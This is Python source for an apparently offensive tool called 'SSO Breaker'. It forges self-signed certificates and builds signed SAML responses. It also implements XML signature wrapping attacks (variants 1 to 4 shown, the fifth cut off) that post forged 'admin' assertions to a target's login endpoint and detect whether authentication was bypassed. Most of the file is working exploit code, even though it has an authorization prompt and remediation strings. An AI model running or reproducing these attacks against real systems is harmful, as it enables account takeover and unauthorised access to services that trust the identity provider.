#!/usr/bin/env python3
import argparse
import base64
import copy
import datetime
import hashlib
import json
import logging
import os
import re
import sys
import time
import urllib.parse
import uuid
import zlib
from dataclasses import dataclass, field
from enum import Enum
from io import BytesIO
from typing import Any, Dict, List, Optional, Tuple

import jwt
import requests
import urllib3
from colorama import Fore, Style, init as colorama_init
from cryptography import x509
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import padding, rsa
from cryptography.hazmat.primitives.asymmetric.rsa import RSAPublicNumbers
from cryptography.x509.oid import NameOID
from lxml import etree

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
colorama_init(autoreset=True)
logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
logger = logging.getLogger("sso_breaker")

BANNER = f"""{Fore.RED}
 ╔═══════════════════════════════════════════════════════════╗
 ║                      SSO Breaker                          ║
 ║   Real XML-DSIG · JWKS Key Confusion · Baseline Detection ║
 ║                    Crafted By ROHIT                       ║
 ╚═══════════════════════════════════════════════════════════╝{Style.RESET_ALL}"""

DS_NS = "http://www.w3.org/2000/09/xmldsig#"
SAML_NS = "urn:oasis:names:tc:SAML:2.0:assertion"
SAMLP_NS = "urn:oasis:names:tc:SAML:2.0:protocol"
NS = {"saml": SAML_NS, "samlp": SAMLP_NS, "ds": DS_NS}


class Severity(Enum):
    CRITICAL = "CRITICAL"
    HIGH = "HIGH"
    MEDIUM = "MEDIUM"
    LOW = "LOW"
    INFO = "INFO"


@dataclass
class Finding:
    title: str
    severity: Severity
    description: str
    evidence: str = ""
    remediation: str = ""
    attack_type: str = ""


@dataclass
class SSOConfig:
    target_url: str
    acs_url: str = ""
    sp_entity_id: str = ""
    idp_entity_id: str = ""
    saml_endpoint: str = ""
    saml_metadata_url: str = ""
    oidc_discovery_url: str = ""
    oidc_auth_endpoint: str = ""
    oidc_token_endpoint: str = ""
    oidc_userinfo_endpoint: str = ""
    oidc_jwks_uri: str = ""
    oidc_client_id: str = ""
    oidc_client_secret: str = ""
    oidc_redirect_uri: str = ""
    cas_login_url: str = ""
    cas_validate_url: str = ""
    cas_service_url: str = ""
    saml_response_sample: str = ""
    id_token_sample: str = ""
    cookies: Dict[str, str] = field(default_factory=dict)
    headers: Dict[str, str] = field(default_factory=dict)
    proxy: str = ""
    timeout: int = 30
    verify_ssl: bool = False
    rate_limit: float = 0.5


# ---------------------------------------------------------------------------
# Rate limiter
# ---------------------------------------------------------------------------
class RateLimiter:
    def __init__(self, min_delay: float = 0.5):
        self.min_delay = min_delay
        self._last = 0.0
        self._consecutive_errors = 0

    def wait(self):
        elapsed = time.time() - self._last
        backoff = self.min_delay * (2 ** min(self._consecutive_errors, 5))
        sleep_time = max(0, backoff - elapsed)
        if sleep_time > 0:
            time.sleep(sleep_time)
        self._last = time.time()

    def record_success(self):
        self._consecutive_errors = 0

    def record_error(self):
        self._consecutive_errors += 1


# ---------------------------------------------------------------------------
# Scope validator — warn before sending traffic
# ---------------------------------------------------------------------------
class ScopeValidator:
    @staticmethod
    def validate(config: SSOConfig) -> bool:
        urls = [
            config.target_url, config.acs_url, config.saml_endpoint,
            config.oidc_auth_endpoint, config.oidc_token_endpoint,
            config.oidc_userinfo_endpoint, config.cas_login_url,
            config.cas_validate_url,
        ]
        domains = set()
        for u in urls:
            if u:
                try:
                    domains.add(urllib.parse.urlparse(u).netloc)
                except Exception:
                    pass
        if not domains:
            logger.error("No valid target URLs configured.")
            return False
        print(f"\n{Fore.YELLOW}[!] Targets in scope:{Style.RESET_ALL}")
        for d in sorted(domains):
            print(f"    • {d}")
        try:
            answer = input(f"\n{Fore.YELLOW}    Confirm you have authorization to test these targets [y/N]: {Style.RESET_ALL}")
        except (EOFError, KeyboardInterrupt):
            return False
        return answer.strip().lower() in ("y", "yes")


# ---------------------------------------------------------------------------
# XML-DSIG signer — REAL canonicalization + signing
# ---------------------------------------------------------------------------
class XMLDSigSigner:
    EXCL_C14N_ALG = "http://www.w3.org/2001/10/xml-exc-c14n#"
    ENVELOPED_ALG = "http://www.w3.org/2000/09/xmldsig#enveloped-signature"
    RSA_SHA256_ALG = "http://www.w3.org/2001/04/xmldsig-more#rsa-sha256"
    SHA256_ALG = "http://www.w3.org/2001/04/xmlenc#sha256"

    def __init__(self, private_key_pem: bytes, cert_pem: bytes):
        self.private_key = serialization.load_pem_private_key(
            private_key_pem, password=None, backend=default_backend()
        )
        self.cert_pem = cert_pem
        lines = cert_pem.decode().strip().split("\n")
        self.cert_b64 = "".join(l for l in lines if not l.startswith("-----"))

    # -- canonicalization helpers ------------------------------------------
    @staticmethod
    def _exc_c14n(element: etree._Element) -> bytes:
        el = copy.deepcopy(element)
        tree = etree.ElementTree(el)
        buf = BytesIO()
        tree.write_c14n(buf, exclusive=True, with_comments=False)
        return buf.getvalue()

    @staticmethod
    def _exc_c14n_with_ns(element: etree._Element, parent: etree._Element = None) -> bytes:
        el = copy.deepcopy(element)
        if parent is not None:
            for pfx, uri in parent.nsmap.items():
                if pfx and pfx not in el.nsmap:
                    used = f"{{{uri}}}" in etree.tostring(el).decode()
                    if used:
                        el.attrib[f"{{http://www.w3.org/2000/xmlns/}}{pfx}"] = uri
        tree = etree.ElementTree(el)
        buf = BytesIO()
        tree.write_c14n(buf, exclusive=True, with_comments=False)
        return buf.getvalue()

    # -- digest computation ------------------------------------------------
    def _compute_digest(self, element: etree._Element) -> str:
        el = copy.deepcopy(element)
        for sig in el.findall(f".//{{{DS_NS}}}Signature"):
            sig.getparent().remove(sig)
        canonical = self._exc_c14n(el)
        digest = hashlib.sha256(canonical).digest()
        return base64.b64encode(digest).decode()

    # -- build SignedInfo --------------------------------------------------
    def _build_signed_info(self, ref_uri: str, digest_value: str) -> etree._Element:
        si = etree.Element(f"{{{DS_NS}}}SignedInfo")
        cm = etree.SubElement(si, f"{{{DS_NS}}}CanonicalizationMethod")
        cm.set("Algorithm", self.EXCL_C14N_ALG)
        sm = etree.SubElement(si, f"{{{DS_NS}}}SignatureMethod")
        sm.set("Algorithm", self.RSA_SHA256_ALG)
        ref = etree.SubElement(si, f"{{{DS_NS}}}Reference")
        ref.set("URI", f"#{ref_uri}")
        transforms = etree.SubElement(ref, f"{{{DS_NS}}}Transforms")
        t1 = etree.SubElement(transforms, f"{{{DS_NS}}}Transform")
        t1.set("Algorithm", self.ENVELOPED_ALG)
        t2 = etree.SubElement(transforms, f"{{{DS_NS}}}Transform")
        t2.set("Algorithm", self.EXCL_C14N_ALG)
        dm = etree.SubElement(ref, f"{{{DS_NS}}}DigestMethod")
        dm.set("Algorithm", self.SHA256_ALG)
        dv = etree.SubElement(ref, f"{{{DS_NS}}}DigestValue")
        dv.text = digest_value
        return si

    # -- RSA-SHA256 sign ---------------------------------------------------
    def _rsa_sign(self, data: bytes) -> str:
        sig = self.private_key.sign(data, padding.PKCS1v15(), hashes.SHA256())
        return base64.b64encode(sig).decode()

    # -- sign assertion (enveloped) ----------------------------------------
    def sign_assertion(self, assertion: etree._Element) -> etree._Element:
        aid = assertion.get("ID")
        if not aid:
            aid = "_" + uuid.uuid4().hex
            assertion.set("ID", aid)
        for old_sig in assertion.findall(f"{{{DS_NS}}}Signature"):
            assertion.remove(old_sig)
        digest_val = self._compute_digest(assertion)
        signed_info = self._build_signed_info(aid, digest_val)
        si_canonical = self._exc_c14n(signed_info)
        sig_value = self._rsa_sign(si_canonical)
        sig_el = etree.Element(f"{{{DS_NS}}}Signature")
        sig_el.append(signed_info)
        sv = etree.SubElement(sig_el, f"{{{DS_NS}}}SignatureValue")
        sv.text = sig_value
        ki = etree.SubElement(sig_el, f"{{{DS_NS}}}KeyInfo")
        xd = etree.SubElement(ki, f"{{{DS_NS}}}X509Data")
        xc = etree.SubElement(xd, f"{{{DS_NS}}}X509Certificate")
        xc.text = self.cert_b64
        issuer = assertion.find(f"{{{SAML_NS}}}Issuer")
        if issuer is not None:
            idx = list(assertion).index(issuer)
            assertion.insert(idx + 1, sig_el)
        else:
            assertion.insert(0, sig_el)
        return assertion

    def sign_response(self, response: etree._Element) -> etree._Element:
        rid = response.get("ID")
        if not rid:
            rid = "_" + uuid.uuid4().hex
            response.set("ID", rid)
        for old_sig in response.findall(f"{{{DS_NS}}}Signature"):
            response.remove(old_sig)
        digest_val = self._compute_digest(response)
        signed_info = self._build_signed_info(rid, digest_val)
        si_canonical = self._exc_c14n(signed_info)
        sig_value = self._rsa_sign(si_canonical)
        sig_el = etree.Element(f"{{{DS_NS}}}Signature")
        sig_el.append(signed_info)
        sv = etree.SubElement(sig_el, f"{{{DS_NS}}}SignatureValue")
        sv.text = sig_value
        ki = etree.SubElement(sig_el, f"{{{DS_NS}}}KeyInfo")
        xd = etree.SubElement(ki, f"{{{DS_NS}}}X509Data")
        xc = etree.SubElement(xd, f"{{{DS_NS}}}X509Certificate")
        xc.text = self.cert_b64
        issuer = response.find(f"{{{SAML_NS}}}Issuer")
        if issuer is not None:
            idx = list(response).index(issuer)
            response.insert(idx + 1, sig_el)
        else:
            response.insert(0, sig_el)
        return response


# ---------------------------------------------------------------------------
# Certificate forger
# ---------------------------------------------------------------------------
class CertForger:
    @staticmethod
    def generate(cn: str = "idp.ssotest.local") -> Tuple[bytes, bytes]:
        key = rsa.generate_private_key(65537, 2048, default_backend())
        priv_pem = key.private_bytes(
            serialization.Encoding.PEM,
            serialization.PrivateFormat.PKCS8,
            serialization.NoEncryption(),
        )
        name = x509.Name([
            x509.NameAttribute(NameOID.COUNTRY_NAME, "US"),
            x509.NameAttribute(NameOID.ORGANIZATION_NAME, "SSO Test"),
            x509.NameAttribute(NameOID.COMMON_NAME, cn),
        ])
        cert = (
            x509.CertificateBuilder()
            .subject_name(name).issuer_name(name)
            .public_key(key.public_key())
            .serial_number(x509.random_serial_number())
            .not_valid_before(datetime.datetime.utcnow() - datetime.timedelta(days=1))
            .not_valid_after(datetime.datetime.utcnow() + datetime.timedelta(days=3650))
            .sign(key, hashes.SHA256(), default_backend())
        )
        return priv_pem, cert.public_bytes(serialization.Encoding.PEM)


# ---------------------------------------------------------------------------
# SAML Metadata parser — auto-discover endpoints from metadata XML
# ---------------------------------------------------------------------------
class SAMLMetadataParser:
    MD_NS = "urn:oasis:names:tc:SAML:2.0:metadata"

    def __init__(self, session: requests.Session, timeout: int = 30):
        self.session = session
        self.timeout = timeout

    def fetch_and_parse(self, url: str) -> Dict[str, str]:
        result = {
            "entity_id": "",
            "acs_url": "",
            "sso_url": "",
            "slo_url": "",
            "certificate": "",
            "name_id_format": "",
        }
        try:
            resp = self.session.get(url, timeout=self.timeout)
            resp.raise_for_status()
            root = etree.fromstring(resp.content)
        except Exception as e:
            logger.error(f"Metadata fetch/parse failed: {e}")
            return result

        md = self.MD_NS
        result["entity_id"] = root.get("entityID", "")

        for sso in root.iter(f"{{{md}}}SingleSignOnService"):
            binding = sso.get("Binding", "")
            if "HTTP-POST" in binding or "HTTP-Redirect" in binding:
                result["sso_url"] = sso.get("Location", "")
                break

        for acs in root.iter(f"{{{md}}}AssertionConsumerService"):
            binding = acs.get("Binding", "")
            if "HTTP-POST" in binding:
                result["acs_url"] = acs.get("Location", "")
                break

        for slo in root.iter(f"{{{md}}}SingleLogoutService"):
            result["slo_url"] = slo.get("Location", "")
            break

        for cert_el in root.iter(f"{{{DS_NS}}}X509Certificate"):
            if cert_el.text:
                result["certificate"] = cert_el.text.strip()
                break

        for nid in root.iter(f"{{{md}}}NameIDFormat"):
            if nid.text:
                result["name_id_format"] = nid.text.strip()
                break

        logger.info(f"Metadata parsed: entity_id={result['entity_id']}, acs={result['acs_url']}")
        return result


# ---------------------------------------------------------------------------
# OIDC Discovery — .well-known + JWKS extraction
# ---------------------------------------------------------------------------
class OIDCDiscovery:
    def __init__(self, session: requests.Session, timeout: int = 30):
        self.session = session
        self.timeout = timeout
        self.config: Dict[str, Any] = {}
        self.jwks: List[Dict] = []
        self.public_keys_pem: List[bytes] = []

    def discover(self, issuer_url: str) -> Dict[str, Any]:
        well_known_paths = [
            "/.well-known/openid-configuration",
            "/.well-known/oauth-authorization-server",
        ]
        for path in well_known_paths:
            url = issuer_url.rstrip("/") + path
            try:
                resp = self.session.get(url, timeout=self.timeout)
                if resp.status_code == 200:
                    self.config = resp.json()
                    logger.info(f"OIDC discovery successful from {url}")
                    logger.info(f"  authorization_endpoint: {self.config.get('authorization_endpoint', 'N/A')}")
                    logger.info(f"  token_endpoint: {self.config.get('token_endpoint', 'N/A')}")
                    logger.info(f"  userinfo_endpoint: {self.config.get('userinfo_endpoint', 'N/A')}")
                    logger.info(f"  jwks_uri: {self.config.get('jwks_uri', 'N/A')}")
                    if self.config.get("jwks_uri"):
                        self._fetch_jwks(self.config["jwks_uri"])
                    return self.config
            except Exception as e:
                logger.debug(f"Discovery at {url} failed: {e}")
        logger.warning("OIDC discovery failed for all well-known paths")
        return {}

    def _fetch_jwks(self, jwks_uri: str):
        try:
            resp = self.session.get(jwks_uri, timeout=self.timeout)
            resp.raise_for_status()
            data = resp.json()
            self.jwks = data.get("keys", [])
            logger.info(f"JWKS fetched: {len(self.jwks)} keys found")
            for jwk in self.jwks:
                if jwk.get("kty") == "RSA":
                    try:
                        pem = self._jwk_to_pem(jwk)
                        self.public_keys_pem.append(pem)
                    except Exception as e:
                        logger.debug(f"JWK→PEM conversion failed: {e}")
        except Exception as e:
            logger.error(f"JWKS fetch failed: {e}")

    @staticmethod
    def _b64url_decode(data: str) -> bytes:
        padding_needed = 4 - len(data) % 4
        if padding_needed != 4:
            data += "=" * padding_needed
        return base64.urlsafe_b64decode(data)

    def _jwk_to_pem(self, jwk: Dict) -> bytes:
        n_bytes = self._b64url_decode(jwk["n"])
        e_bytes = self._b64url_decode(jwk["e"])
        n = int.from_bytes(n_bytes, "big")
        e = int.from_bytes(e_bytes, "big")
        pub_numbers = RSAPublicNumbers(e, n)
        pub_key = pub_numbers.public_key(default_backend())
        return pub_key.public_bytes(
            serialization.Encoding.PEM,
            serialization.PublicFormat.SubjectPublicKeyInfo,
        )


# ---------------------------------------------------------------------------
# Baseline detector — calibrated success detection
# ---------------------------------------------------------------------------
class BaselineDetector:
    def __init__(self, session: requests.Session, target_url: str, timeout: int = 30):
        self.session = session
        self.target_url = target_url
        self.timeout = timeout
        self.bl_status: int = 0
        self.bl_length: int = 0
        self.bl_cookies: set = set()
        self.bl_location: str = ""
        self.bl_error_keywords: List[str] = []
        self.calibrated: bool = False

    def calibrate(self):
        logger.info("Calibrating baseline with invalid SAML responses...")
        invalid_payloads = [
            base64.b64encode(b"<invalid>nope</invalid>").decode(),
            base64.b64encode(b"not-xml-at-all").decode(),
            "",
        ]
        statuses = []
        lengths = []
        cookies_all = set()
        locations = []
        error_kw = set()

        for payload in invalid_payloads:
            try:
                resp = self.session.post(
                    self.target_url,
                    data={"SAMLResponse": payload, "RelayState": ""},
                    allow_redirects=False,
                    timeout=self.timeout,
                )
                statuses.append(resp.status_code)
                lengths.append(len(resp.content))
                cookies_all.update(resp.cookies.keys())
                locations.append(resp.headers.get("Location", ""))
                for kw in ["error", "invalid", "fail", "denied", "unauthorized", "bad request"]:
                    if kw in resp.text.lower():
                        error_kw.add(kw)
            except requests.RequestException:
                statuses.append(0)

        if statuses:
            self.bl_status = max(set(statuses), key=statuses.count)
        if lengths:
            self.bl_length = sum(lengths) // len(lengths)
        self.bl_cookies = cookies_all
        if locations:
            self.bl_location = max(set(locations), key=locations.count)
        self.bl_error_keywords = list(error_kw)
        self.calibrated = True
        logger.info(
            f"Baseline: status={self.bl_status}, avg_length={self.bl_length}, "
            f"cookies={self.bl_cookies}, error_kw={self.bl_error_keywords}"
        )

    def is_success(self, resp: requests.Response) -> Tuple[bool, List[str]]:
        if not self.calibrated:
            return self._heuristic_check(resp)
        diffs = []
        if resp.status_code != self.bl_status:
            diffs.append(f"status:{self.bl_status}→{resp.status_code}")
        new_cookies = set(resp.cookies.keys()) - self.bl_cookies
        session_cookies = [c for c in new_cookies
                          if any(s in c.lower() for s in ["session", "sid", "token", "auth", "jwt", "connect"])]
        if session_cookies:
            diffs.append(f"session_cookie:{session_cookies}")
        resp_len = len(resp.content)
        if self.bl_length > 0:
            ratio = abs(resp_len - self.bl_length) / max(self.bl_length, 1)
            if ratio > 0.3:
                diffs.append(f"length:{self.bl_length}→{resp_len}")
        location = resp.headers.get("Location", "")
        if location and location != self.bl_location:
            if self.bl_location and "login" in self.bl_location.lower() and "login" not in location.lower():
                diffs.append(f"redirect_changed:{location[:80]}")
            elif not self.bl_location and "dashboard" in location.lower() or "home" in location.lower():
                diffs.append(f"new_redirect:{location[:80]}")
        has_bl_errors = any(kw in resp.text.lower() for kw in self.bl_error_keywords) if self.bl_error_keywords else False
        if self.bl_error_keywords and not has_bl_errors:
            diffs.append("error_keywords_absent")
        is_success = len(diffs) >= 2 or bool(session_cookies)
        return is_success, diffs

    @staticmethod
    def _heuristic_check(resp: requests.Response) -> Tuple[bool, List[str]]:
        indicators = []
        if resp.status_code in (200, 302, 303):
            indicators.append(f"status:{resp.status_code}")
        for c in resp.cookies.keys():
            if any(s in c.lower() for s in ["session", "sid", "token", "auth"]):
                indicators.append(f"cookie:{c}")
        loc = resp.headers.get("Location", "")
        if loc and "error" not in loc.lower() and "login" not in loc.lower():
            indicators.append(f"redirect:{loc[:60]}")
        bad = ["invalid", "error", "denied", "unauthorized", "bad request", "signature"]
        if not any(b in resp.text.lower()[:500] for b in bad):
            indicators.append("no_error_text")
        return len(indicators) >= 3, indicators


# ---------------------------------------------------------------------------
# SSO Flow Handler — follow multi-step redirect chains
# ---------------------------------------------------------------------------
class SSOFlowHandler:
    def __init__(self, session: requests.Session, timeout: int = 30):
        self.session = session
        self.timeout = timeout
        self.steps: List[Dict] = []

    def follow(self, start_url: str, max_hops: int = 15) -> List[Dict]:
        self.steps = []
        url = start_url
        for i in range(max_hops):
            try:
                resp = self.session.get(url, allow_redirects=False, timeout=self.timeout)
                step = {
                    "hop": i + 1,
                    "url": url,
                    "status": resp.status_code,
                    "location": resp.headers.get("Location", ""),
                    "cookies_set": list(resp.cookies.keys()),
                    "content_length": len(resp.content),
                }
                self.steps.append(step)
                if resp.status_code in (301, 302, 303, 307, 308):
                    loc = resp.headers.get("Location", "")
                    if not loc:
                        break
                    if not loc.startswith("http"):
                        loc = urllib.parse.urljoin(url, loc)
                    url = loc
                else:
                    break
            except requests.RequestException as e:
                self.steps.append({"hop": i + 1, "url": url, "error": str(e)})
                break
        return self.steps

    def find_saml_response(self) -> Optional[str]:
        for step in self.steps:
            for field_name in ["url", "location"]:
                val = step.get(field_name, "")
                if "SAMLResponse" in val:
                    parsed = urllib.parse.parse_qs(urllib.parse.urlparse(val).query)
                    if "SAMLResponse" in parsed:
                        return parsed["SAMLResponse"][0]
        return None

    def find_auth_code(self) -> Optional[str]:
        for step in self.steps:
            for field_name in ["url", "location"]:
                val = step.get(field_name, "")
                match = re.search(r"[?&]code=([^&]+)", val)
                if match:
                    return match.group(1)
        return None


# ---------------------------------------------------------------------------
# SAML Builder
# ---------------------------------------------------------------------------
class SAMLBuilder:
    @staticmethod
    def build_response(
        issuer: str = "https://idp.example.com",
        name_id: str = "admin@example.com",
        audience: str = "https://sp.example.com",
        acs_url: str = "https://sp.example.com/acs",
        attributes: Dict[str, str] = None,
    ) -> etree._Element:
        now = datetime.datetime.utcnow()
        fmt = "%Y-%m-%dT%H:%M:%SZ"
        not_before = (now - datetime.timedelta(minutes=5)).strftime(fmt)
        not_after = (now + datetime.timedelta(hours=1)).strftime(fmt)
        instant = now.strftime(fmt)
        resp_id = "_resp_" + uuid.uuid4().hex
        assert_id = "_assert_" + uuid.uuid4().hex
        sess_idx = "_sess_" + uuid.uuid4().hex

        resp = etree.Element(f"{{{SAMLP_NS}}}Response")
        resp.set("ID", resp_id)
        resp.set("Version", "2.0")
        resp.set("IssueInstant", instant)
        resp.set("Destination", acs_url)
        etree.SubElement(resp, f"{{{SAML_NS}}}Issuer").text = issuer
        status = etree.SubElement(resp, f"{{{SAMLP_NS}}}Status")
        etree.SubElement(status, f"{{{SAMLP_NS}}}StatusCode").set(
            "Value", "urn:oasis:names:tc:SAML:2.0:status:Success"
        )

        assertion = etree.SubElement(resp, f"{{{SAML_NS}}}Assertion")
        assertion.set("Version", "2.0")
        assertion.set("ID", assert_id)
        assertion.set("IssueInstant", instant)
        etree.SubElement(assertion, f"{{{SAML_NS}}}Issuer").text = issuer

        subject = etree.SubElement(assertion, f"{{{SAML_NS}}}Subject")
        nid = etree.SubElement(subject, f"{{{SAML_NS}}}NameID")
        nid.set("Format", "urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress")
        nid.text = name_id
        sc = etree.SubElement(subject, f"{{{SAML_NS}}}SubjectConfirmation")
        sc.set("Method", "urn:oasis:names:tc:SAML:2.0:cm:bearer")
        scd = etree.SubElement(sc, f"{{{SAML_NS}}}SubjectConfirmationData")
        scd.set("NotOnOrAfter", not_after)
        scd.set("Recipient", acs_url)

        conds = etree.SubElement(assertion, f"{{{SAML_NS}}}Conditions")
        conds.set("NotBefore", not_before)
        conds.set("NotOnOrAfter", not_after)
        ar = etree.SubElement(conds, f"{{{SAML_NS}}}AudienceRestriction")
        etree.SubElement(ar, f"{{{SAML_NS}}}Audience").text = audience

        authn = etree.SubElement(assertion, f"{{{SAML_NS}}}AuthnStatement")
        authn.set("AuthnInstant", instant)
        authn.set("SessionIndex", sess_idx)
        ac = etree.SubElement(authn, f"{{{SAML_NS}}}AuthnContext")
        etree.SubElement(ac, f"{{{SAML_NS}}}AuthnContextClassRef").text = \
            "urn:oasis:names:tc:SAML:2.0:ac:classes:PasswordProtectedTransport"

        if attributes is None:
            attributes = {"email": name_id, "role": "admin"}
        attr_stmt = etree.SubElement(assertion, f"{{{SAML_NS}}}AttributeStatement")
        for attr_name, attr_val in attributes.items():
            a = etree.SubElement(attr_stmt, f"{{{SAML_NS}}}Attribute")
            a.set("Name", attr_name)
            a.set("NameFormat", "urn:oasis:names:tc:SAML:2.0:attrname-format:basic")
            av = etree.SubElement(a, f"{{{SAML_NS}}}AttributeValue")
            av.set(f"{{{' http://www.w3.org/2001/XMLSchema-instance'.strip()}}}type", "xs:string")
            av.text = attr_val

        return resp

    @staticmethod
    def encode(root: etree._Element) -> str:
        xml_bytes = etree.tostring(root, xml_declaration=True, encoding="UTF-8")
        return base64.b64encode(xml_bytes).decode()

    @staticmethod
    def decode(encoded: str) -> Optional[etree._Element]:
        try:
            raw = base64.b64decode(encoded)
            try:
                raw = zlib.decompress(raw, -15)
            except zlib.error:
                pass
            return etree.fromstring(raw)
        except Exception as e:
            logger.error(f"SAML decode failed: {e}")
            return None

    @staticmethod
    def get_assertion(root: etree._Element) -> Optional[etree._Element]:
        assertions = root.findall(f".//{{{SAML_NS}}}Assertion")
        return assertions[0] if assertions else None

    @staticmethod
    def set_nameid(element: etree._Element, value: str):
        for nid in element.findall(f".//{{{SAML_NS}}}NameID"):
            nid.text = value
        for av in element.findall(f".//{{{SAML_NS}}}Attribute[@Name='email']/{{{SAML_NS}}}AttributeValue"):
            av.text = value


# ---------------------------------------------------------------------------
# HTTP helper shared by attackers
# ---------------------------------------------------------------------------
class AttackSession:
    def __init__(self, config: SSOConfig):
        self.config = config
        self.session = requests.Session()
        self.session.verify = config.verify_ssl
        self.session.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                          "(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        })
        if config.headers:
            self.session.headers.update(config.headers)
        if config.cookies:
            self.session.cookies.update(config.cookies)
        if config.proxy:
            self.session.proxies = {"http": config.proxy, "https": config.proxy}
        self.rate = RateLimiter(config.rate_limit)
        self.baseline = BaselineDetector(self.session, config.acs_url or config.target_url, config.timeout)
        self.findings: List[Finding] = []

    def submit_saml(self, xml_root: etree._Element, tag: str) -> Optional[requests.Response]:
        encoded = SAMLBuilder.encode(xml_root)
        target = self.config.acs_url or self.config.saml_endpoint or self.config.target_url
        self.rate.wait()
        try:
            resp = self.session.post(
                target,
                data={"SAMLResponse": encoded, "RelayState": ""},
                allow_redirects=False,
                timeout=self.config.timeout,
            )
            logger.info(f"[{tag}] → {resp.status_code}  len={len(resp.content)}")
            self.rate.record_success()
            return resp
        except requests.RequestException as e:
            logger.error(f"[{tag}] request failed: {e}")
            self.rate.record_error()
            return None

    def check(self, resp: Optional[requests.Response], tag: str) -> Tuple[bool, str]:
        if resp is None:
            return False, "no response"
        ok, diffs = self.baseline.is_success(resp)
        if ok:
            logger.warning(f"[{tag}] POTENTIAL SUCCESS: {diffs}")
        return ok, "; ".join(diffs) if diffs else ""

    def add_finding(self, title, severity, desc, evidence="", remediation="", attack_type=""):
        f = Finding(title=title, severity=severity, description=desc,
                    evidence=evidence, remediation=remediation, attack_type=attack_type)
        self.findings.append(f)
        color = Fore.RED if severity == Severity.CRITICAL else Fore.YELLOW
        print(f"{color}[!] FOUND: {title} [{severity.value}]{Style.RESET_ALL}")
        return f


# ---------------------------------------------------------------------------
# SAML Attacker — real XML-DSIG, all 8 XSW, + 7 more attacks
# ---------------------------------------------------------------------------
class SAMLAttacker:
    EVIL_NAMEID = "admin@target.com"

    def __init__(self, config: SSOConfig):
        self.config = config
        self.sess = AttackSession(config)
        self.priv_pem, self.cert_pem = CertForger.generate()
        self.signer = XMLDSigSigner(self.priv_pem, self.cert_pem)

    def _base_root(self) -> etree._Element:
        if self.config.saml_response_sample:
            root = SAMLBuilder.decode(self.config.saml_response_sample)
            if root is not None:
                return root
        return SAMLBuilder.build_response(
            issuer=self.config.idp_entity_id or "https://idp.example.com",
            name_id="user@example.com",
            audience=self.config.sp_entity_id or "https://sp.example.com",
            acs_url=self.config.acs_url or "https://sp.example.com/acs",
        )

    def _evil_assertion(self, root: etree._Element) -> etree._Element:
        orig = SAMLBuilder.get_assertion(root)
        if orig is None:
            return etree.Element(f"{{{SAML_NS}}}Assertion")
        evil = copy.deepcopy(orig)
        evil.set("ID", "_evil_" + uuid.uuid4().hex)
        SAMLBuilder.set_nameid(evil, self.EVIL_NAMEID)
        for sig in evil.findall(f".//{{{DS_NS}}}Signature"):
            sig.getparent().remove(sig)
        return evil

    # ---- XSW 1-8 --------------------------------------------------------
    def xsw_1(self) -> Optional[Finding]:
        logger.info("[XSW-1] Evil assertion before original, original in wrapper")
        root = copy.deepcopy(self._base_root())
        orig = SAMLBuilder.get_assertion(root)
        if orig is None:
            return None
        evil = self._evil_assertion(root)
        wrapper = etree.Element(f"{{{SAML_NS}}}Assertion")
        wrapper.set("ID", "_wrap_" + uuid.uuid4().hex)
        wrapper.set("Version", "2.0")
        wrapper.set("IssueInstant", datetime.datetime.utcnow().strftime("%Y-%m-%dT%H:%M:%SZ"))
        orig_copy = copy.deepcopy(orig)
        root.remove(orig)
        wrapper.append(orig_copy)
        root.insert(0, evil)
        root.append(wrapper)
        resp = self.sess.submit_saml(root, "XSW-1")
        ok, ev = self.sess.check(resp, "XSW-1")
        if ok:
            return self.sess.add_finding(
                "XSW Variant 1 — Evil assertion before signed wrapper",
                Severity.CRITICAL,
                "SP processed evil assertion positioned before the signed original.",
                ev, "Validate signed assertion is the one consumed. Use strict XPath.", "XSW-1")
        return None

    def xsw_2(self) -> Optional[Finding]:
        logger.info("[XSW-2] Evil assertion replaces original, original in wrapper sibling")
        root = copy.deepcopy(self._base_root())
        orig = SAMLBuilder.get_assertion(root)
        if orig is None:
            return None
        evil = self._evil_assertion(root)
        orig_copy = copy.deepcopy(orig)
        root.remove(orig)
        root.insert(0, evil)
        wrapper = etree.SubElement(root, f"{{{SAMLP_NS}}}Extensions")
        wrapper.append(orig_copy)
        resp = self.sess.submit_saml(root, "XSW-2")
        ok, ev = self.sess.check(resp, "XSW-2")
        if ok:
            return self.sess.add_finding(
                "XSW Variant 2 — Original in Extensions, evil at top",
                Severity.CRITICAL, "SP used the evil unsigned assertion.", ev,
                "Verify Reference URI matches consumed assertion.", "XSW-2")
        return None

    def xsw_3(self) -> Optional[Finding]:
        logger.info("[XSW-3] Evil assertion wraps original as child")
        root = copy.deepcopy(self._base_root())
        orig = SAMLBuilder.get_assertion(root)
        if orig is None:
            return None
        evil = self._evil_assertion(root)
        orig_copy = copy.deepcopy(orig)
        root.remove(orig)
        inner = etree.SubElement(evil, f"{{{SAML_NS}}}OriginalAssertion")
        inner.append(orig_copy)
        root.insert(0, evil)
        resp = self.sess.submit_saml(root, "XSW-3")
        ok, ev = self.sess.check(resp, "XSW-3")
        if ok:
            return self.sess.add_finding(
                "XSW Variant 3 — Original nested inside evil assertion",
                Severity.CRITICAL, "SP traversed into evil assertion's claims.", ev,
                "Only process top-level assertion matching signed Reference.", "XSW-3")
        return None

    def xsw_4(self) -> Optional[Finding]:
        logger.info("[XSW-4] Original in Extensions, evil as sibling assertion")
        root = copy.deepcopy(self._base_root())
        orig = SAMLBuilder.get_assertion(root)
        if orig is None:
            return None
        evil = self._evil_assertion(root)
        orig_copy = copy.deepcopy(orig)
        root.remove(orig)
        ext = etree.SubElement(root, f"{{{SAMLP_NS}}}Extensions")
        ext.append(orig_copy)
        root.append(evil)
        resp = self.sess.submit_saml(root, "XSW-4")
        ok, ev = self.sess.check(resp, "XSW-4")
        if ok:
            return self.sess.add_finding(
                "XSW Variant 4 — Original in Extensions, evil sibling",
                Severity.CRITICAL, "SP processed sibling evil assertion.", ev,
                "Reject assertions outside expected XML path.", "XSW-4")
        return None

    def xsw_5(self) -> Optional[Finding]:
        logger.info("[XSW-5] Original in ds:Object inside evil's Signature")
        root = copy.deepcopy(self._base_root())
        orig = SAMLBuilder.get_assertion(root)
        if orig is None:
            return None
